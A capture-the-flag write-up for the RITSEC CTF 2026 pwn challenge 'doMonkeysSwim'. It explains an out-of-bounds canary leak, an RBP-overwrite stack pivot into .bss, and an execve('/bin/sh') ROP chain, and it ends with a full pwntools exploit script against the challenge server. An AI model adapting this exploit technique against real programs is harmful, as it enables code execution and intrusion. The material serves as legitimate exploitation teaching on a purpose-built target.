# doMonkeysSwim - RITSEC CTF 2026

**Category:** Pwn  
**Points:** 23/500  
**Author:** monkeyboy5043  

---

## 1. Reconnaissance: First Look & Rabbit Holes

**DISCLAIMER:** This challenge pulled a sneaky one on us. It was initially distributed as a dynamically linked binary with its own `libc`. Naturally, I spent a good chunk of time writing the perfect exploit, only to find out it was failing remotely. After staring at my exploit for half an hour and practically throwing myself into the organizers' Discord ticket channel, I saw the announcement: the binary had been recompiled as *statically linked* :(. To add insult to injury, the new binary didn't even have the `/bin/sh\x00` string neatly tucked inside it, meaning we have to write it into memory ourselves. 

Before all that drama, I was given the binary and its `libc`. Like any good monkey, I followed the standard recon routine:

```bash
Depp1135@pwn:~$ file doMonkeysSwim && checksec doMonkeysSwim
doMonkeysSwim: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=44b1b07cd553a28e8eb2b749c27a5f739b306a47, for GNU/Linux 3.2.0, not stripped
[*] './doMonkeysSwim'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

First things first: it's a statically linked binary, so I immediately tossed the provided `libc` into the trash. On the bright side, there’s **No PIE**, which means we'll definitely have some fun building a static ROP chain! 👀

Diving into the decompilation, `main()` is straightforward:

```c
00401efe    int64_t main()
{
    // ...
    game();
    syscall(0x3c);  // exit
    // ...
}
```

The `main` function isn't doing anything crazy—its only job is to call the `game()` routine. That being said, having a clean `syscall` right before exit will probably come in incredibly handy later for our ROP chain.

Moving into `game()`:

```c
00401e4a    int64_t game()
{
    // ...
    int32_t choice = print_menu();
    
    while (true)
    {
        switch (choice)
        {
            case 1: mallic();          break;
            case 2: freee();           break;
            case 3: monkey_see();      break;
            case 4: monkey_do();       break;
            case 5: monkey_swaperoo(); break;
            case 6: break; // exit loop
            default:
                _IO_puts("\nThe monkeys in the ship don't know what that means?!\n");
        }
        
        choice = print_menu();
    }
    // ...
}
```

This is your standard CTF menu loop. The `while (true)` structure is actually a massive blessing here—it makes building multi-stage exploits significantly easier since we don't have to worry about the program terminating after executing a single payload.

*Note: I'm skipping the `mallic()` and `freee()` functions. Despite their names practically screaming "heap pwn!", they were giant rabbit holes doing useless operations completely unrelated to actual heap allocation.*

The first *truly* broken function is `monkey_see()`:

```c
00401bbc    int64_t monkey_see()
{
    // ...
    _IO_puts("\nTODO: fix later\n");
    // ... (Input parsing omitted for brevity) ...
    
    int32_t index;
    int64_t buffer[3];
    
    // Vulnerable read!
    _IO_printf("\nThat monkey holds this: 0x%016lx\n\n", buffer[index]);
    // ...
}
```

I know what you're thinking: wasn't the massive `TODO: fix later` print a dead giveaway? Absolutely. But that naked `printf` was also practically begging to be abused for leaks. 

Because there are zero bounds checks on `index`, we have a powerful **Out-Of-Bounds (OOB) Read** primitive. This is perfect for leaking the stack canary.

But wait, there's more broken stuff! Let's look at `monkey_do()`:

```c
00401c98    int64_t monkey_do()
{
    // ...
    _IO_puts("\nOo oo Aa AA?\n");
    char buffer[0x18]; 
    _IO_fgets(&buffer, 0x28, stdin); // BOF right here
    _IO_puts("Looks like the monkey stole this function ");
    // ...
}
```

This is a classic Buffer Overflow, but with a catch. The `fgets` call reads `0x28` bytes into a `0x18` byte buffer. We are definitely overwriting *something*, but is it enough to reach `RIP`?

Last but not least, we have `monkey_swaperoo()`:

```c
00401cf2    int64_t monkey_swaperoo()
{
    // ...
    int64_t bss_buf;
    _IO_fgets(&bss_buf, 0x69, stdin);
    // ... (A bunch of weird assignments to .bss)
}
```

I'm still not entirely sure *why* the author wrote it this way, but the TL;DR is: this function lets us conveniently write `0x69` arbitrary bytes directly into the `.bss` section. 

---

## 2. The Strategy: Stack Pivoting

Now let's jump into the real exploit. My first thought was the obvious one: smash the stack inside `monkey_do()` and ROP our way to a shell. But as soon as I started mapping out the buffer, I realized we had a severe real estate problem.

The buffer is `0x18` (24) bytes long, but `fgets` allows us to write up to `0x28` (40) bytes. We only have 16 bytes of overflow. Why is this an issue? Because between our buffer and the saved return address (`RIP`), we have to contend with the presence of the stack canary and the saved `RBP`. 

Let's visualize the stack layout right before our `fgets` input:

```text
+------------------+ <--- RSP
|  buffer (0x18)   |
|                  |
+------------------+ <--- RSP + 0x18
|      canary      |
+------------------+ <--- RSP + 0x20
|    saved RBP     |
+------------------+ <--- RSP + 0x28
|    saved RIP     |  (game+118)
+------------------+
```

To reach `RIP`, we would need to overwrite past `RSP + 0x28`. But `fgets` only gives us `0x28` bytes *total*. Meaning we stop right at the doorstep of `RIP`. 

I threw a classic De Bruijn pattern at it in GDB just to see exactly where our input died. Here is the stack **after** our `fgets` payload:

```text
+------------------+ <--- RSP
|    'aaaabaaa'    | 
|    'caaadaaa'    | 
|    'eaaafaaa'    | (buffer filled)
+------------------+ <--- RSP + 0x18
|    'gaaahaaa'    | (canary overwritten!)
+------------------+ <--- RSP + 0x20
|   'iaaajaa\x00'  | (saved RBP overwritten!)
+------------------+ <--- RSP + 0x28
|    saved RIP     | (untouched -> game+118)
+------------------+
```

As expected, the return address (`game+118`) remains completely untouched. But all is not lost! Take a close look at `RBP`. We successfully overwrote the saved base pointer. 

> **Note:** You might wonder why we only control 7 bytes of `RBP`. This is a quirk of `fgets`. It reads `N-1` bytes and forcibly appends a null terminator (`\x00`). So out of our 40 bytes, 39 are our payload, and the last byte overwriting `RBP` is a forced `\x00`. Since user-space addresses start with null bytes anyway, this is perfectly fine!

**The Lightbulb Moment:**
If we control `RBP`, we can execute a **Stack Pivot**. 

When `monkey_do()` finishes, its epilogue essentially does this:
```nasm
leave
ret
```
Which translates to:
```nasm
mov rsp, rbp   ; RSP now points to our controlled RBP!
pop rbp
pop rip        ; Execution jumps to whatever is on our fake stack!
```

**The Final Plan:**
1. Use `monkey_see()` to leak the canary.
2. Use `monkey_swaperoo()` to write a massive ROP chain (and our `/bin/sh\x00` string) into the `.bss` section.
3. Use `monkey_do()`'s off-by-a-bit overflow to overwrite the saved `RBP` with the address of our `.bss` fake stack.
4. When `monkey_do()` returns, it pivots `RSP` to `.bss`, pops our ROP chain into `RIP`, and pops a shell!

---

## 3. The Exploit

Now that we have a solid plan, let's break down the actual exploit steps.

### Step 1: Leak the Canary
We can easily leak the stack canary using `monkey_see()`. Since there are no bounds checks on the `index`, we can simply input an index that points to the canary's location on the stack. 

How do we find the right index? Well, I used the time-honored CTF tradition: *fuzz it until it works*. By inputting various indices and observing the output, I found that an index of `3` gives us the canary value. 

> **INFO:** For those curious about the exact math: The target array is `int64_t buffer[3]`. Since each element is 8 bytes, the entire array occupies exactly 24 bytes. The compiler places the stack canary immediately after this array in memory. Therefore, asking for `buffer[3]` jumps exactly `3 * 8 = 24` bytes forward, landing squarely on the 8-byte canary.

### Step 2: Write the ROP Chain to .bss
Since the binary is statically linked, we have to build our ROP chain using gadgets from the main binary itself. This is a bit more work, but it’s also a fun puzzle! Obviously, I tried to find a one-gadget first, but no such luck.

The fastest way to get a shell is to use the `syscall` instruction we spotted in `main()` to execute `execve("/bin/sh", NULL, NULL)`. This requires us to set up the registers as follows:

```nasm
rax = 59           ; syscall number for execve
rdi = &"/bin/sh"   ; pointer to the "/bin/sh" string
rsi = 0            ; argv (NULL)
rdx = 0            ; envp (NULL)
```

I fired up `ROPgadget`, and surprisingly, I found exactly what we needed:

```text
0x0000000000401f43 : pop rdi ; ret  
0x0000000000401f49 : pop rax ; ret  
0x0000000000401f45 : pop rsi ; ret  
0x0000000000401f47 : pop rdx ; ret  
```

### Step 3: Pivot RBP to .bss
Pivoting the stack into `.bss` might seem easy, but doing it right requires knowing exactly how the fake stack will align once `RSP` lands there. 

First off, our controlled `.bss` region starts at `0x4cca60`:

```text
004cca60  int64_t bed = 0x0
004cca68  int64_t data_4cca68 = 0x0
004cca70  int64_t data_4cca70 = 0x0
...
```

Our fake stack frame will look like this once `RIP` starts popping instructions:

```text
[ pop rdi ; ret ]
[ address of "/bin/sh\x00" ]
[ pop rax ; ret ]
[ 59 ]
[ pop rsi ; ret ]
[ 0 ]
[ pop rdx ; ret ]
[ 0 ]
[ syscall ]
[ "/bin/sh\x00" ]  <-- Placed right at the end!
```

The main issue here is that we have no pointers to a `/bin/sh\x00` string in the binary, so we have to write it ourselves. The best place to drop it is right at the end of our ROP chain. By doing this, we can mathematically calculate its address (`start + 0x58`) and load that into `RDI` without needing any extra gadgets to do pointer arithmetic.

> **NOTE:** Appending strings to the end of the payload is a common pwn technique. If we placed the string *before* the gadgets, `fgets` would stop reading as soon as it hit the null byte (`\x00`), and we wouldn't be able to write the rest of our ROP chain!

**Wait, there is a massive catch here!**
If we just blindly place our ROP gadgets at the start of `.bss` and pivot `RBP` over, we will crash the binary before `RIP` is ever popped. Why? Because of the Stack Smashing Protector (SSP). Let's look at the assembly for the end of `game()`:

```nasm
0x401ee7 <game+157>    nop    
0x401ee8 <game+158>    mov    rax, qword ptr [rbp - 8]     ; RAX, [bed] => 0x4cca68 (bed+8)
0x401eec <game+162>    sub    rax, qword ptr fs:[0x28]     ; RAX => 0x9b2b856521643f68
0x401ef5 <game+171>    je     game+178                     ; <game+178>
0x401ef7 <game+173>    call   __stack_chk_fail_local       ; <__stack_chk_fail_local>

0x401efc <game+178>    leave  
0x401efd <game+179>    ret   
```

Notice the instruction at `0x401ee8`: `mov rax, qword ptr [rbp - 8]`. The canary check doesn't use a static offset from `RSP`; it checks relative to **`RBP`**! 

Because we overwrote `RBP` with our `.bss` address during the overflow, the program tries to validate the canary *using our fake `RBP`*. 
If we set `fake_rbp = start + 0x8`, then `rbp - 8` points exactly to `start` (`0x4cca60`). 

This means the very first 8 bytes of our `.bss` payload **MUST be the leaked canary**. If we start our payload immediately with a ROP gadget, the XOR check against `fs:[0x28]` will fail, and the binary will scream `__stack_chk_fail_local` and die before we can `leave; ret`.

### Step 4: Trigger the Pivot
Finally, we have everything set up. We just need to end the program gracefully to trigger the `leave; ret` epilogue and execute the stack pivot. Since we are inside a `while(true)` loop in `game()`, we can simply select the `exit` option (option `6`) from the menu. `monkey_do()` will return, pivoting our stack into `.bss` and popping a shell!

---

## 4. The Pwn

This is the final exploit script. It’s a bit rough around the edges, but it gets the job done perfectly.

```python
#!/usr/bin/env python3

from pwn import *
import re

e = ELF("./bin/doMonkeysSwim")
context.binary = e

# context.log_level = "debug"
gdbscript = """
b *0x401ccc
"""

# =========================
#        CONNECTION
# =========================

def conn():
    if args.LOCAL:
        r = process([e.path])
    else:
        r = remote("dms.ctf.ritsec.club", 1400)
    return r

# =========================
#        GET FLAG
# =========================

FLAG_RE = re.compile(rb"RS{[\w\d!?:]*}")

def grab_flag(r, name: str = "flag.txt"):
    if not args.LOCAL:
        r.sendline(str(f"cat {name}").encode())
        data = r.recvall(timeout=1)

        m = FLAG_RE.search(data)
        if m:
            flag = m.group(0).decode("ascii", errors="ignore")
            print(flag, flush=True)
        else:
            text = data.decode("ascii", errors="ignore")
            print(text, flush=True)

# =========================
#        LEAK HELPERS
# =========================

HEX_ADDR_RE = rb"0x[0-9a-fA-F]+"

def leak_hex(data: bytes, all: bool = False, pattern: bytes = HEX_ADDR_RE):
    matches = re.findall(pattern, data)
    if not matches:
        log.failure(f"No hex address found in: {data!r}")
        raise ValueError("no hex address found")

    leaks = [int(m, 16) for m in matches]

    if all:
        log.success(f"Found {len(leaks)} leaks: {[hex(x) for x in leaks]}")
        return leaks

    leak = leaks[0]
    log.success(f"Found leak: {hex(leak)}")
    return leak


def leak_canary(r: process|remote) -> int:
    r.sendlineafter(b">> ", b"3")
    r.recvuntil(b"later", timeout=1)
    r.sendline(b"3") # Index 3 targets the stack canary perfectly

    r.recvuntil(b"this: ")
    return leak_hex(r.recvline().strip())

# =========================
#           MAIN
# =========================

def main():
    r = conn()
    if args.DBG:
        gdb.attach(r, gdbscript=gdbscript)

    # 1. Leak the Canary
    canary = leak_canary(r)

    # 2. Setup Stack Pivot addresses
    start = 0x4cca60
    fake_rbp = start + 0x8 

    # 3. Define Gadgets
    syscall = 0x401f26
    pop_rax = 0x401f49
    pop_rdi = 0x401f43
    pop_rsi = 0x401f45
    pop_rdx = 0x401f47

    # 4. Construct ROP Chain
    rop_chain = b""
    rop_chain += p64(canary)       # Canary for the BSS stack
    rop_chain += p64(fake_rbp)     # Fake RBP 
    rop_chain += p64(pop_rax) 
    rop_chain += p64(59)           # execve syscall number
    rop_chain += p64(pop_rdi) 
    rop_chain += p64(start + 0x58) # Pointer to "/bin/sh\x00" at the end of the chain
    rop_chain += p64(pop_rsi)
    rop_chain += p64(0)
    rop_chain += p64(pop_rdx)
    rop_chain += p64(0)
    rop_chain += p64(syscall)      # Trigger execve
    rop_chain += b"/bin/sh\x00"    # Our target string, lands exactly at start + 0x58

    # 5. Write ROP chain to .bss via monkey_swaperoo
    r.sendlineafter(b">> ", b"5")
    r.sendlineafter(b": ", rop_chain)
    r.sendlineafter(b": ", b"a")

    # 6. Smash the stack via monkey_do and overwrite RBP
    r.sendlineafter(b">> ", b"4")
    # 24 bytes of padding + the valid canary + 7 bytes of our fake RBP
    r.sendline(b"A"*24 + p64(canary) + p64(fake_rbp)[:7]) 

    # 7. Exit loop to trigger epilogue and pivot!
    r.sendlineafter(b">> ", b"6")

    # Pwned.
    grab_flag(r)
    r.interactive()


if __name__ == "__main__":
    main()
```